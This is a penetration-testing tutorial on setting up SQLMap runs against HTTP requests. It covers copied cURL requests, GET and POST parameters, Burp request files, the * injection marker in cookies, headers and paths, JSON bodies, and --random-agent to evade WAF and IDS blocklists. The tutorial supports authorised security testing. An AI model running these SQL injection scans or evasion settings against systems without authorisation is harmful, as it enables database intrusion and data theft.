# Running SQLMap on HTTP Requests

The most common reason SQLMap fails to find a real vulnerability is a misconfigured request rather than the absence of injection. Getting the request setup right before running detection saves significant time.

***

## Four Ways to Feed SQLMap a Request

### 1. Copy as cURL from Browser DevTools

The fastest method for any browser-visible request. Open DevTools (F12), go to the Network tab, right-click any request, and select "Copy as cURL". Then replace `curl` with `sqlmap`:

```bash
sqlmap 'http://www.example.com/?id=1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0)' \
  -H 'Accept: text/html,*/*' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Connection: keep-alive' \
  --compressed
```

All headers, cookies, and parameters are preserved exactly as the browser sent them, eliminating any manual transcription errors.

### 2. GET Parameter via -u

```bash
# Basic GET
sqlmap -u "http://www.example.com/page.php?id=1"

# Test only a specific parameter when multiple exist
sqlmap -u "http://www.example.com/page.php?id=1&page=2" -p id
```

### 3. POST Data via --data

```bash
# Test all POST parameters
sqlmap 'http://www.example.com/login.php' --data 'uid=1&name=test'

# Mark a specific parameter for injection with *
sqlmap 'http://www.example.com/login.php' --data 'uid=1*&name=test'
```

The `*` marker tells SQLMap to test exactly that position rather than scanning all parameters. Useful when you already know which parameter is vulnerable and want to skip the discovery phase.

### 4. Full Request File via -r (Most Reliable for Complex Requests)

Capture the request in Burp Suite (right-click > "Copy to file") and save it as `req.txt`:

```http
POST /login.php HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0)
Accept: text/html,application/xhtml+xml
Cookie: PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

uid=1&name=test
```

```bash
sqlmap -r req.txt
```

This approach handles everything: cookies, custom headers, POST body, and non-standard HTTP methods, without needing individual flags for each component.

***

## The * Injection Marker

The asterisk can be placed anywhere in the request, not just in standard parameter values:

```bash
# Inject in a cookie value
sqlmap -u "http://target.com/" --cookie="id=1*"

# Inject in a custom header
sqlmap -u "http://target.com/" -H "X-Forwarded-For: 1*"

# Inject in a request file body
# Inside req.txt: uid=1*&name=test
sqlmap -r req.txt

# Inject in URL path
sqlmap -u "http://target.com/users/1*/profile"
```

This is particularly valuable for cookie-based injection and custom header injection, which SQLMap would not test by default without the explicit marker.

***

## Custom Request Options Reference

| Option | Purpose | Example |
|--------|---------|---------|
| `--cookie` | Session cookies | `--cookie='PHPSESSID=abc123'` |
| `-H` | Custom headers | `-H 'X-API-Key: secret'` |
| `--referer` | Set Referer header | `--referer='http://google.com'` |
| `-A / --user-agent` | Set User-Agent | `-A 'Mozilla/5.0...'` |
| `--random-agent` | Randomise User-Agent | `--random-agent` |
| `--mobile` | Imitate smartphone browser | `--mobile` |
| `--method` | Override HTTP method | `--method PUT` |
| `--headers` | Multiple custom headers | `--headers="X-A: 1\nX-B: 2"` |
| `--host` | Override Host header | `--host='internal.target.com'` |

***

## Handling Modern API Formats

SQLMap detects and handles JSON and XML request bodies automatically when using `-r`:

```bash
# req.txt contains a JSON API request
cat req.txt
```
```http
POST /api/articles HTTP/1.0
Host: www.example.com
Content-Type: application/json

{"data": [{"id": "1", "type": "articles"}]}
```

```bash
sqlmap -r req.txt
# SQLMap detects JSON and prompts: "JSON data found. Do you want to process it? [Y/n]"
# With --batch, this defaults to Y
```

SQLMap parses all JSON keys and values as potential injection points, treating them with the same thoroughness as form parameters. The same applies to XML-formatted bodies.

***

## The --random-agent Flag: Why It Matters

SQLMap's default User-Agent is immediately identifiable:

```
User-Agent: sqlmap/1.4.9.12#dev (http://sqlmap.org)
```

Many WAFs and IDS systems blocklist this string by default, causing every request to return a 403 or redirect before any injection testing begins. Using `--random-agent` selects a random legitimate browser string from SQLMap's built-in database for each session:

```bash
sqlmap -r req.txt --random-agent --batch
```

On any real engagement target, `--random-agent` should be considered a default inclusion rather than an optional add-on. Pair it with `--mobile` when testing applications that have separate mobile code paths, as they may have different injection points or less hardened validation logic than the desktop version.
